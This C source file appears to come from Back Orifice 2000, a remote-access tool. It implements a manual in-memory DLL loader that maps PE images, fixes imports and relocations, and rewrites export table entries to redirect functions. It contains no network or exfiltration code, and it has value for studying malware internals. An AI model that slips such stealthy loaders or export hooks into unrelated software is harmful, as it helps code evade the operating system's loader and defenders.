/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com.
*/

#include <windows.h>
#include <winnt.h>

#include "dll_load.h"
byte g_bIsWinNT;

#pragma pack(push,1)

typedef struct {
	DWORD	dwPageRVA;
	DWORD	dwBlockSize;
} IMAGE_FIXUP_BLOCK, *PIMAGE_FIXUP_BLOCK;

typedef struct {
	WORD	offset:12;
	WORD	type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

typedef struct __imageparameters {
	void	*pImageBase;
	char	svName[MAX_PATH];
	DWORD	dwFlags;
	int		nLockCount;
	struct __imageparameters *next;
} IMAGE_PARAMETERS;

typedef BOOL (WINAPI *DLLMAIN_T)(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

#pragma pack(pop)


/* Process-global variables */

IMAGE_PARAMETERS *g_pImageParamHead;
CRITICAL_SECTION g_DLLCrit;

/* Function implementations */

/*
 * void CheckWindowsVersion(void);
 * Detecta la version de windows
 *
 * Ajusta
 *	g_bIsWinNT a 1 si estamos en un NT
 *  g_bIsWinNT a 0 si NO estamos en un NT
 */
void CheckWindowsVersion(void)
{
	OSVERSIONINFO osvi;
	osvi.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);

	GetVersionEx(&osvi);
	
	if (osvi.dwPlatformId==VER_PLATFORM_WIN32_NT)
		g_bIsWinNT=1;
	else
		g_bIsWinNT=0;

}

/*
 * Initialization Routines                                                                                 
 */
void InitializeDLLLoad(void)
{
	InitializeCriticalSection(&g_DLLCrit);
	g_pImageParamHead=NULL;
}

void KillDLLLoad(void)
{
	IMAGE_PARAMETERS *cur,*next;
	cur=g_pImageParamHead;
	while(cur!=NULL) {
		next=cur->next;
		e_free(cur);
		cur=next;
	}

	DeleteCriticalSection(&g_DLLCrit);
}


/*
 * Internal DLL list management                                                                            
 */
// returns 0 if just ref count increment, 1 if this is a new addition, -1 on error
static int AddDLLReference(void *pImageBase, char *svName, DWORD dwFlags)
{
	IMAGE_PARAMETERS *cur;

	EnterCriticalSection(&g_DLLCrit);

	// Find DLL in list
	for(cur=g_pImageParamHead;cur!=NULL;cur=cur->next) {
		if(cur->pImageBase==pImageBase) break;
	}

	if(cur!=NULL) {
		// increment dll count
		cur->nLockCount++;
		LeaveCriticalSection(&g_DLLCrit);
		return 0;
	}

	// Add new dll to list
	cur=(IMAGE_PARAMETERS *)e_malloc(sizeof(IMAGE_PARAMETERS));
	if(cur==NULL) {
		LeaveCriticalSection(&g_DLLCrit);
		return -1;
	}

	cur->pImageBase=pImageBase;
	if(svName!=NULL) {
		lstrcpyn(cur->svName,svName, MAX_PATH);
	} else cur->svName[0]='\0';
	cur->nLockCount=1;
	cur->dwFlags=dwFlags;
	cur->next=g_pImageParamHead;
	g_pImageParamHead=cur;

	LeaveCriticalSection(&g_DLLCrit);
	return 1;
}

// returns 0 if just a reference count dec, 1 if fully removed from list, -1 on error
static int RemoveDLLReference(void *pImageBase, char *svName, DWORD *pdwFlags)
{
	IMAGE_PARAMETERS *cur,*prev;

	EnterCriticalSection(&g_DLLCrit);

	// Find DLL in list
	prev=NULL;
	for(cur=g_pImageParamHead;cur!=NULL;cur=cur->next) {
		if(cur->pImageBase==pImageBase) break;
		prev=cur;
	}
	if(cur==NULL) {
		LeaveCriticalSection(&g_DLLCrit);
		return -1;
	}

	// decrement dll count
	cur->nLockCount--;
	// look up dll information
	*pdwFlags=cur->dwFlags;
	lstrcpyn(svName,cur->svName,MAX_PATH);

	// Remove if time to go
	if(cur->nLockCount==0) {
		if(prev==NULL) {
			g_pImageParamHead=g_pImageParamHead->next;
			e_free(cur);
		} else {
			prev->next=cur->next;
			e_free(cur);
		}

		LeaveCriticalSection(&g_DLLCrit);
		return 1;
	}

	LeaveCriticalSection(&g_DLLCrit);
	return 0;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// GetDLLHandle()                                                                                          //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////


// Like GetModuleHandle(), returns null if the module is not loaded, returns a base address otherwise
HMODULE GetDLLHandle(char *svName)
{
	IMAGE_PARAMETERS *cur;

	if(svName==NULL) return NULL;

	EnterCriticalSection(&g_DLLCrit);

	// Find DLL in list
	for(cur=g_pImageParamHead;cur!=NULL;cur=cur->next) {
		if(lstrcmpi(cur->svName,svName)==0) break;
	}

	if(cur!=NULL) {
		LeaveCriticalSection(&g_DLLCrit);
		return (HMODULE) cur->pImageBase;
	}

	LeaveCriticalSection(&g_DLLCrit);
	return NULL;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// GetDLLFileName()                                                                                          //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////


// Like GetModuleFileName(), returns 0 on failure
DWORD GetDLLFileName(HMODULE hModule, LPTSTR lpFileName, DWORD nSize)
{
	DWORD dwRet;
	IMAGE_PARAMETERS *cur;

	if(hModule==NULL || lpFileName==NULL || nSize==0) return 0;

	if((dwRet=GetModuleFileName(hModule,lpFileName,nSize))!=0) return dwRet;

	EnterCriticalSection(&g_DLLCrit);

	// Find DLL in list
	for(cur=g_pImageParamHead;cur!=NULL;cur=cur->next) {
		if(cur->pImageBase==hModule) break;
	}

	if(cur!=NULL) {
		LeaveCriticalSection(&g_DLLCrit);
		lstrcpyn(lpFileName,cur->svName,nSize);
		return lstrlen(lpFileName);
	}

	LeaveCriticalSection(&g_DLLCrit);
	return 0;
}




/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// GetDLLProcAddress()                                                                                          //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////



// Like GetProcAddress(), returns null if the procedure/ordinal is not there, otherwise returns function addr.
FARPROC GetDLLProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
	PIMAGE_OPTIONAL_HEADER   poh;
	PIMAGE_EXPORT_DIRECTORY ped;
	int nOrdinal;
	int nDirCount;
	DWORD *pAddrTable;
	DWORD dwRVA;
	DWORD dwAddr;

	if(hModule==NULL) return NULL;

	// Get header

    poh = (PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET (hModule);

	// Get number of image directories in list

	nDirCount=poh->NumberOfRvaAndSizes;
	if(nDirCount<16) return FALSE;

	// - Sift through export table -----------------------------------------------

	if(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size==0) return NULL;

	// Good, we have an export table. Lets get it.

	ped=(IMAGE_EXPORT_DIRECTORY *)RVATOVA(hModule,poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Get ordinal of desired function

	if(HIWORD((DWORD)lpProcName)==0) {
		nOrdinal=(LOWORD((DWORD)lpProcName)) - ped->Base;
	} else {

		// Go through name table and find appropriate ordinal

		int i,count;
		DWORD *pdwNamePtr;
		WORD *pwOrdinalPtr;

		count=ped->NumberOfNames;
		pdwNamePtr=(DWORD *)RVATOVA(hModule,ped->AddressOfNames);
		pwOrdinalPtr=(WORD *)RVATOVA(hModule,ped->AddressOfNameOrdinals);

		for(i=0;i<count;i++) {

			// XXX should be a binary search, but, again, fuck it.

			char *svName;
			svName=(char *)RVATOVA(hModule,*pdwNamePtr);

			if(lstrcmp(svName,lpProcName)==0) {
				nOrdinal=*pwOrdinalPtr;
				break;
			}

			pdwNamePtr++;
			pwOrdinalPtr++;
		}
		if(i==count) return NULL;
	}

	// Look up RVA of this ordinal
	pAddrTable=(DWORD *)RVATOVA(hModule,ped->AddressOfFunctions);

	dwRVA=pAddrTable[nOrdinal];


	// Check if it's a forwarder, or a local addr
	// XXX  Should probably do this someday. Just don't define forwarders. You're
	// XXX  not loading kernel32.dll with this shit anyway.

	dwAddr=(DWORD) RVATOVA(hModule,dwRVA);

	return (FARPROC) dwAddr;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// SetDLLProcAddress()                                                                                          //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Modifies an image. Must be loaded with RWX_PERMISSIONS, or have the export
// table writable
FARPROC SetDLLProcAddress(HMODULE hModule, LPCSTR lpProcName, FARPROC fpAddr)
{
	PIMAGE_OPTIONAL_HEADER   poh;
	int nDirCount;
	PIMAGE_EXPORT_DIRECTORY ped;
	int nOrdinal;
	DWORD *pAddrTable;
	DWORD dwOldAddr;

	if(hModule==NULL) return FALSE;

	// Get header

    poh = (PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET (hModule);

	// Get number of image directories in list

	nDirCount=poh->NumberOfRvaAndSizes;
	if(nDirCount<16) return FALSE;

	// - Sift through export table -----------------------------------------------

	if(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size==0) return FALSE;

	// Good, we have an export table. Lets get it.

	ped=(IMAGE_EXPORT_DIRECTORY *)RVATOVA(hModule,poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Get ordinal of desired function

	if(HIWORD((DWORD)lpProcName)==0) {
		nOrdinal=(LOWORD((DWORD)lpProcName)) - ped->Base;
	} else {

		// Go through name table and find appropriate ordinal

		int i,count;
		DWORD *pdwNamePtr;
		WORD *pwOrdinalPtr;

		count=ped->NumberOfNames;
		pdwNamePtr=(DWORD *)RVATOVA(hModule,ped->AddressOfNames);
		pwOrdinalPtr=(WORD *)RVATOVA(hModule,ped->AddressOfNameOrdinals);

		for(i=0;i<count;i++) {

			// XXX should be a binary search, but, again, fuck it.

			char *svName;
			svName=(char *)RVATOVA(hModule,*pdwNamePtr);

			if(lstrcmp(svName,lpProcName)==0) {
				nOrdinal=*pwOrdinalPtr;
				break;
			}

			pdwNamePtr++;
			pwOrdinalPtr++;
		}
		if(i==count) return FALSE;
	}

	// Replace with different virtual address

	// Look up RVA of this ordinal and replace with RVA of other function
	pAddrTable=(DWORD *)RVATOVA(hModule,ped->AddressOfFunctions);

	dwOldAddr=(DWORD) RVATOVA(hModule,(pAddrTable[nOrdinal]));
	pAddrTable[nOrdinal]=(DWORD) VATORVA(hModule,((DWORD)fpAddr));

	return (FARPROC) dwOldAddr;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ResetDLLProcAddress()                                                                                   //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////

BOOL ResetDLLProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
	char svName[MAX_PATH+1];
	DWORD dwAddr;
	DWORD dwNewAddr;

	if(GetDLLFileName(hModule,svName,MAX_PATH+1)) {
		// Load another copy of the DLL
		HMODULE hNewMod=LoadDLLEx(svName,NULL,FORCE_LOAD_NEW_IMAGE);
		if(hNewMod==NULL) return FALSE;
		dwAddr=(DWORD)GetDLLProcAddress(hNewMod,lpProcName);
		if(dwAddr==(DWORD)NULL) {
			FreeDLL(hNewMod);
			return FALSE;
		}

		dwNewAddr=(DWORD)RVATOVA(hModule,VATORVA(hNewMod,dwAddr));

		FreeDLL(hNewMod);

		SetDLLProcAddress(hModule,lpProcName,(FARPROC)dwNewAddr);

		return TRUE;
	}

	return FALSE;
}



/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Internal DLL Loader code                                                                                //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////


static BOOL RunDLLMain(void *pImageBase, DWORD dwImageSize, BOOL bDetach)
{
	// Get entry point from header
	PIMAGE_OPTIONAL_HEADER   poh;
	PIMAGE_FILE_HEADER pfh;
	DLLMAIN_T pDllMain;
	BOOL bRet;

    pfh = (PIMAGE_FILE_HEADER)PEFHDROFFSET(pImageBase);
	if((pfh->Characteristics & IMAGE_FILE_DLL)==0) return TRUE;

	poh = (PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET (pImageBase);
	pDllMain=(DLLMAIN_T) RVATOVA(pImageBase, poh->AddressOfEntryPoint);

	// Call dllmain the right way

	if(bDetach) {
		bRet=pDllMain((HMODULE) pImageBase, DLL_PROCESS_DETACH, NULL);
	} else {
		bRet=pDllMain((HMODULE) pImageBase, DLL_PROCESS_ATTACH, NULL);
	}

	return bRet;
}

BOOL PrepareDLLImage(void *pMemoryImage, DWORD dwImageSize, BOOL bResolve, BOOL bRebind)
{
	// Get headers
	PIMAGE_OPTIONAL_HEADER   poh;
    PIMAGE_SECTION_HEADER    psh;
	int nDirCount;
	DWORD delta;

    poh = (PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET (pMemoryImage);
    psh = (PIMAGE_SECTION_HEADER)SECHDROFFSET (pMemoryImage);

	// Get number of image directories in list
	nDirCount=poh->NumberOfRvaAndSizes;
	if(nDirCount<16) return FALSE;

	// - Process import table -----------------------------------------------

	if(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size!=0) {
		PIMAGE_IMPORT_DESCRIPTOR pid;
		pid=(IMAGE_IMPORT_DESCRIPTOR *)RVATOVA(pMemoryImage,poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

		// For all imported DLLs
		while(pid->OriginalFirstThunk!=0) {
			char *svDllName;
			HMODULE hDll;

			svDllName=(char *) RVATOVA(pMemoryImage,pid->Name);

			// Map library into address space (could also use LoadDLL())
			hDll=GetModuleHandle(svDllName);
			if(hDll==NULL) hDll=LoadLibrary(svDllName);

			if(hDll==NULL) return FALSE;

			// Bind if not bound already
			if(pid->TimeDateStamp==0 || bRebind) {
				PIMAGE_THUNK_DATA ptd_in,ptd_out;

				// Store DLL infoz

				pid->ForwarderChain=(DWORD)hDll;
				pid->TimeDateStamp=0xCDC31337; // This is bullshit cuz I don't want to call libc.

				// Fill in Import Address Table

				ptd_in=(PIMAGE_THUNK_DATA) RVATOVA(pMemoryImage, pid->OriginalFirstThunk);
				ptd_out=(PIMAGE_THUNK_DATA) RVATOVA(pMemoryImage, pid->FirstThunk);

				while(ptd_in->u1.Function!=NULL) {
					FARPROC func;

					// Determine if ordinal or name pointer
					if(ptd_in->u1.Ordinal & 0x80000000) {
						// Ordinal
						func=GetProcAddress(hDll,MAKEINTRESOURCE(ptd_in->u1.Ordinal));
					} else {
						// Function name
						PIMAGE_IMPORT_BY_NAME pibn;
						pibn=(PIMAGE_IMPORT_BY_NAME) RVATOVA(pMemoryImage,ptd_in->u1.AddressOfData);
						func=GetProcAddress(hDll,(char *)pibn->Name);
					}

					if(func==NULL) return FALSE;

					// Write address to appropriate location
					ptd_out->u1.Function = (PDWORD) func;

					ptd_in++;
					ptd_out++;
				}
			}

			pid++;
		}
	}

	// - Process relocation tables if necessary ----------------------------------

	// Calculate fixup delta
	delta=(DWORD)pMemoryImage - (DWORD)poh->ImageBase;

	if((delta!=0) && (poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size!=0)) {
		PIMAGE_FIXUP_BLOCK pfb;
		pfb=(PIMAGE_FIXUP_BLOCK)RVATOVA(pMemoryImage,poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);


		// For each fixup block
		while(pfb->dwPageRVA!=0) {
			PIMAGE_FIXUP_ENTRY pfe;
			int i,count;

			count=(pfb->dwBlockSize-sizeof(IMAGE_FIXUP_BLOCK))/sizeof(IMAGE_FIXUP_ENTRY);
			pfe=(PIMAGE_FIXUP_ENTRY)((char *)pfb + sizeof(IMAGE_FIXUP_BLOCK));

			// For each fixup entry
			for(i=0;i<count;i++) {
				void *fixaddr;
				int adjust;

				fixaddr=RVATOVA(pMemoryImage,pfb->dwPageRVA + pfe->offset);
				switch(pfe->type) {
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGH:
					*((WORD *)fixaddr) += HIWORD(delta);
					break;
				case IMAGE_REL_BASED_LOW:
					*((WORD *)fixaddr) += LOWORD(delta);
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*((DWORD *)fixaddr) += delta;
					break;
				case IMAGE_REL_BASED_HIGHADJ: // This one's really fucked up.
					adjust=((*((WORD *)fixaddr)) << 16) | (*(WORD *)(pfe+1));
					adjust += delta;
					adjust += 0x00008000;
					*((WORD *)fixaddr) = HIWORD(adjust);
					pfe++;
					break;
				default:
					return FALSE;
				}

				pfe++;
			}

			pfb=(PIMAGE_FIXUP_BLOCK)((char *)pfb + pfb->dwBlockSize);
		}
	}



	return TRUE;
}

static BOOL ProtectDLLImage(void *pMemoryImage, BOOL bRWX)
{
	// Get Number of Sections
	PIMAGE_FILE_HEADER pfh;
	int nSectionCount;
	PIMAGE_OPTIONAL_HEADER poh;
	DWORD hdrlen;
	int i;
	PIMAGE_SECTION_HEADER psh;

	pfh=(PIMAGE_FILE_HEADER) PEFHDROFFSET(pMemoryImage);
	nSectionCount=pfh->NumberOfSections;

	// Get PE Header Length + Section Header Length
	poh=(PIMAGE_OPTIONAL_HEADER) OPTHDROFFSET(pMemoryImage);
	hdrlen=poh->SizeOfHeaders;

	// Protect sections one by one
	psh=(PIMAGE_SECTION_HEADER) SECHDROFFSET(pMemoryImage);
	for(i=0;i<nSectionCount;i++) {
		void *secMemAddr;
		int secLen;
		DWORD newProtect=0,oldProtect;
		BOOL bWrite, bRead, bExec, bShared;

		// Get Section Address
		secMemAddr  = (char *)RVATOVA(pMemoryImage, psh->VirtualAddress);
		secLen = psh->SizeOfRawData;

		// Parse Characteristics and protect memory appropriately
		bWrite  = (psh->Characteristics & IMAGE_SCN_MEM_WRITE)?TRUE:FALSE;
		bRead   = (psh->Characteristics & IMAGE_SCN_MEM_READ)?TRUE:FALSE;
		bExec   = (psh->Characteristics & IMAGE_SCN_MEM_EXECUTE)?TRUE:FALSE;
		bShared = (psh->Characteristics & IMAGE_SCN_MEM_SHARED)?TRUE:FALSE;

		if(bWrite && bRead && bExec && bShared) newProtect=PAGE_EXECUTE_READWRITE;
		else if(bWrite && bRead && bExec) newProtect=PAGE_EXECUTE_WRITECOPY;
		else if(bRead && bExec) newProtect=PAGE_EXECUTE_READ;
		else if(bExec) newProtect=PAGE_EXECUTE;
		else if(bWrite && bRead && bShared) newProtect=PAGE_READWRITE;
		else if(bWrite && bRead) newProtect=PAGE_WRITECOPY;
		else if(bRead) newProtect=PAGE_READONLY;

		if(bRWX) newProtect=PAGE_WRITECOPY;

		if(psh->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) newProtect |= PAGE_NOCACHE;

		if(newProtect==0) return FALSE;

		VirtualProtect(secMemAddr,secLen,newProtect,&oldProtect);

		psh++;
	}

	return TRUE;
}


BOOL MapDLLFromImage(void *pDLLFileImage, void *pMemoryImage)
{
	// Get Number of Sections
	PIMAGE_FILE_HEADER pfh;
	int nSectionCount;
	PIMAGE_OPTIONAL_HEADER poh;
	DWORD hdrlen;
	int i;
	PIMAGE_SECTION_HEADER psh;

	pfh=(PIMAGE_FILE_HEADER) PEFHDROFFSET(pDLLFileImage);
	nSectionCount=pfh->NumberOfSections;

	// Get PE Header Length + Section Header Length
	poh=(PIMAGE_OPTIONAL_HEADER) OPTHDROFFSET(pDLLFileImage);
	hdrlen=poh->SizeOfHeaders;

	// Copy PE Header + Section Headers
	memcpy(pMemoryImage,pDLLFileImage,hdrlen);

	// Copy Sections one by one
	psh=(PIMAGE_SECTION_HEADER) SECHDROFFSET(pDLLFileImage);
	for(i=0;i<nSectionCount;i++) {
		void *secMemAddr, *secFileAddr;
		int secLen;

		// Copy Section data
		secMemAddr  = (char *)pMemoryImage + psh->VirtualAddress;
		secFileAddr = (char *)pDLLFileImage + psh->PointerToRawData;
		secLen = psh->SizeOfRawData;

		memcpy(secMemAddr,secFileAddr,secLen);

		psh++;
	}



	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// LoadDLLFromImage()                                                                                      //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////

HMODULE LoadDLLFromImage(void *pDLLFileImage, char *svMappingName, DWORD dwFlags)
{
	// Examine DOS Header
	PIMAGE_DOS_HEADER doshead;
	PIMAGE_FILE_HEADER pfh;
	int nSectionCount;
	void *pPreferredImageBase;
	DWORD dwImageSize;
	void *pImageBase;
	HANDLE hmapping;
	PIMAGE_OPTIONAL_HEADER poh;
	int dllaction;

	doshead=(PIMAGE_DOS_HEADER) pDLLFileImage;
	if(doshead->e_magic!=IMAGE_DOS_SIGNATURE) return NULL;

	// Ensure our input is of good length
	if(svMappingName!=NULL) {
		if(lstrlen(svMappingName) >= MAX_PATH) return NULL;
	}

	// Determine File Format
	if(*(DWORD *)NTSIGNATURE(pDLLFileImage) != IMAGE_NT_SIGNATURE) return NULL;


	// Get PE Header
	pfh=(PIMAGE_FILE_HEADER) PEFHDROFFSET(pDLLFileImage);


	// Ensure proper machine type
	//if(pfh->Machine!=IMAGE_FILE_MACHINE_I386) return NULL;
	// XXX Verify Characteristics
	// XXX I don't bother to do this yet.


	// Get Section Count
	nSectionCount=pfh->NumberOfSections;


	// Get PE Optional Header
	poh=(PIMAGE_OPTIONAL_HEADER) OPTHDROFFSET(pDLLFileImage);


	// Ensure we are an executable image, not a rom image
	if(poh->Magic!=0x010B) return NULL;


	// Get preferred image base and image length
	pPreferredImageBase=(void *)poh->ImageBase;
	dwImageSize=poh->SizeOfImage;

	// Get base address of virtual image
	hmapping=NULL;

	pImageBase=GetDLLHandle(svMappingName);
	if(pImageBase==NULL) {
		BOOL bCreated=FALSE;
		BOOL bRebased=FALSE;
		// If not mapped into this process, then we should map it now

// Esto es para windows nt, de momento se quita

		if(g_bIsWinNT) {
			// === Windows NT DLL Loading (supports shared sections) ===
			if(svMappingName!=NULL) {
				hmapping=OpenFileMapping(FILE_MAP_WRITE,TRUE,svMappingName);
				bCreated=FALSE;
			}
			if(hmapping==NULL) {
				hmapping=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,dwImageSize+SIZE_OF_PARAMETER_BLOCK,svMappingName);
				if(hmapping==NULL) return NULL;
				bCreated=TRUE;
			}

			// Try to load file mapping view at preferred image base (not gonna happen in Win9x..sigh)

			pImageBase=MapViewOfFileEx(hmapping,FILE_MAP_WRITE,0,0,0,pPreferredImageBase);
			if(pImageBase==NULL) {
				pImageBase=MapViewOfFileEx(hmapping,FILE_MAP_WRITE,0,0,0,NULL);
			}
			CloseHandle(hmapping);
			if(pImageBase==NULL) return NULL;
		} else {
			// === Windows 9x DLL Loading (does not support shared sections) ===
			pImageBase=VirtualAlloc(pPreferredImageBase,dwImageSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
			if(pImageBase==NULL) {
				pImageBase=VirtualAlloc(NULL,dwImageSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
				if(pImageBase==NULL) return NULL;
			}

			bCreated=TRUE;
		}

		// Now map DLL from file image into appropriate memory image (if just created)
		// Also remap if DLL is being rebased as well (gotta fix relocations)

		if(bCreated || (pImageBase!=pPreferredImageBase)) {
			if(!MapDLLFromImage(pDLLFileImage,pImageBase)) {
				if(g_bIsWinNT) UnmapViewOfFile(pImageBase);
				else VirtualFree(pImageBase,0,MEM_RELEASE);
				return NULL;
			}
		}

		// Prepare DLL image (handle relocations/import/export/etc)

		if(!(dwFlags & LOAD_LIBRARY_AS_DATAFILE)) {
			if(!PrepareDLLImage(pImageBase, dwImageSize, (dwFlags & DONT_RESOLVE_DLL_REFERENCES)?FALSE:TRUE,(dwFlags & REBIND_IMAGE_IMPORTS)?TRUE:FALSE)) {
				if(g_bIsWinNT) UnmapViewOfFile(pImageBase);
				else VirtualFree(pImageBase,0,MEM_RELEASE);
				return NULL;
			}

			// Resolve DLL references

			if(!(dwFlags & DONT_RESOLVE_DLL_REFERENCES)) {
				BOOL bRet;
				bRet=RunDLLMain(pImageBase,dwImageSize,DLL_ATTACH);
				if(!bRet) {
					if(g_bIsWinNT) UnmapViewOfFile(pImageBase);
					else VirtualFree(pImageBase,0,MEM_RELEASE);
					return NULL;
				}
			}


			// Apply appropriate protections

			if(!ProtectDLLImage(pImageBase, (dwFlags & RWX_PERMISSIONS)?TRUE:FALSE) ){
				if(g_bIsWinNT) UnmapViewOfFile(pImageBase);
				else VirtualFree(pImageBase,0,MEM_RELEASE);
				return NULL;
			}
		}
	}


	// Add to DLL table/increase reference count

	dllaction=AddDLLReference(pImageBase,svMappingName,dwFlags);
	if(dllaction==-1) {
		if(hmapping!=NULL) {
			if(g_bIsWinNT) UnmapViewOfFile(pImageBase);
			else VirtualFree(pImageBase,0,MEM_RELEASE);
		}
		return NULL;
	}

	return (HMODULE) pImageBase;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// LoadDLLEx()                                                                                             //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////

HMODULE LoadDLLEx(LPCTSTR lpLibFileName, HANDLE hFile, DWORD dwFlags)
{
	char svPath[MAX_PATH+1];
	char *svFilePart;
	int nPathLen;
	HANDLE hfile;
	HANDLE hmapping;
	void *baseaddr;
	HMODULE ret;

	// Find DLL File
	if(dwFlags & LOAD_WITH_ALTERED_SEARCH_PATH) {
		return NULL;
	} else {
		nPathLen=SearchPath(NULL,lpLibFileName,".dll",MAX_PATH,svPath,&svFilePart);
		if(nPathLen==0) return NULL;
	}

	// Open File
	hfile=CreateFile(svPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
	if(hfile==INVALID_HANDLE_VALUE) return NULL;

	// Create a file mapping
	hmapping=CreateFileMapping(hfile, NULL, PAGE_READONLY, 0, 0, NULL);

	// Close file handle since we don't need it anymore
	CloseHandle(hfile);

	// Map file mapping object to memory image
	baseaddr=MapViewOfFile(hmapping,FILE_MAP_READ,0,0,0);
	if(baseaddr==NULL) {
		CloseHandle(hmapping);
		return NULL;
	}

	// Now pass off to LoadDLLFromImage
	if(dwFlags & FORCE_LOAD_NEW_IMAGE) {
		ret=LoadDLLFromImage(baseaddr, NULL, dwFlags & ~LOAD_WITH_ALTERED_SEARCH_PATH);
	} else {
		ret=LoadDLLFromImage(baseaddr, svFilePart, dwFlags & ~LOAD_WITH_ALTERED_SEARCH_PATH);
	}


	// Close file mapping
	UnmapViewOfFile(baseaddr);
	CloseHandle(hmapping);

	// Return base address as an instance handle
	return (HMODULE) ret;
}



/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// LoadDLL()                                                                                               //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////



HMODULE LoadDLL(LPCTSTR lpLibFileName)
{
	return LoadDLLEx(lpLibFileName,NULL,0);
}




/////////////////////////////////////////////////////////////////////////////////////////////////////////////
// FreeDLL()                                                                                               //
/////////////////////////////////////////////////////////////////////////////////////////////////////////////


BOOL FreeDLL(HMODULE hLibModule)
{
	PIMAGE_DOS_HEADER doshead;
	PIMAGE_OPTIONAL_HEADER poh;
	DWORD dwImageSize;
	DWORD dwFlags;
	char svName[MAX_PATH];
	int dllaction;
	BOOL bRet;

	if(hLibModule==NULL) return FALSE;

	// Examine DOS Header
	doshead=(PIMAGE_DOS_HEADER) hLibModule;
	if(doshead->e_magic!=IMAGE_DOS_SIGNATURE) return FALSE;

	// Determine File Format
	if(*(DWORD *)NTSIGNATURE(hLibModule) != IMAGE_NT_SIGNATURE) return FALSE;

	// Get PE Optional Header
	poh=(PIMAGE_OPTIONAL_HEADER) OPTHDROFFSET(hLibModule);

	// Ensure we are an executable image, not a rom image
	if(poh->Magic!=0x010B) return FALSE;

	// Get image length
	dwImageSize=poh->SizeOfImage;

	// Get from DLL table/decrease reference count
	dllaction=RemoveDLLReference(hLibModule,svName,&dwFlags);
	if(dllaction==-1) return (BOOL) NULL;

	// Call DllMain if necessary
	bRet=TRUE;

	if(!(dwFlags & (LOAD_LIBRARY_AS_DATAFILE | DONT_RESOLVE_DLL_REFERENCES))) {
		if(dllaction) {
			RunDLLMain(hLibModule,dwImageSize,DLL_DETACH);
			if(g_bIsWinNT) bRet=UnmapViewOfFile(hLibModule);
			else bRet=VirtualFree(hLibModule,0,MEM_RELEASE);
		}
	}

	return bRet;
}
